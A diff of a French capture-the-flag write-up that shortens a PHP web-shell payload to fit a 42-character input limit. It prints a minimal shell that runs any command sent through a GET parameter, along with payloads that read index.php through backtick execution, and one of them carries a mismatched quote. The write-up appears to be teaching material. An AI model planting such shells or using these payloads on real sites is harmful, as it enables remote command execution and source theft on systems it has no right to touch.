@@ -38,25 +38,18 @@ taille : 45
 Malheureusement notre payload est trop grand 45 caractères alors que la limite est de 42..Il nous faut
 trouver un moyen de le réduire.
 
-Après quelques recherches sur "Mini Shell PHP", on trouve celui-ci : <?=@`$_GET[c]`; Il n'est pas
-adapté à cause de ses ";" et "?" mais on va le modifier pour l'utiliser.
-Explication du shell
-<?=@`$_GET[c]`;
+Après quelques recherches sur "Mini Shell PHP", on trouve celui-ci : 
+><?=@\`$_GET[c]`; 
 
-| |
-| |
-|
------->
-Execute
-la
-commande
-système
-grace
-aux
-backticks
-:
-| ------------> Récupère une commande par GET
-----------------> Enleve les erreurs
+Il n'est pas
+adapté à cause de ses ";" et "?" mais on va le modifier pour l'utiliser.
+
+Explication du shell
+><?=@\`$_GET[c]`;
+
+Execute la commande système grace aux backticks
+Récupère une commande par GET
+@ = Enleve les erreurs
 
 
 On peut donc remplacer system('ls') par echo `ls`. Notre payload devient donc :
@@ -67,7 +60,7 @@ taille : 39
 Parfait la taille est respectée mais on a toujours pas de fichier intéressant. Nous voulons alors inspecter
 le contenu d'index.php :
 ><script language=PHP>echo `cat index.php`</script> taille 50
->
+
 La taille de notre script est trop grande, on le réduit encore :
 
 ><script language='PHP>echo `cat i*`</script> taille 43
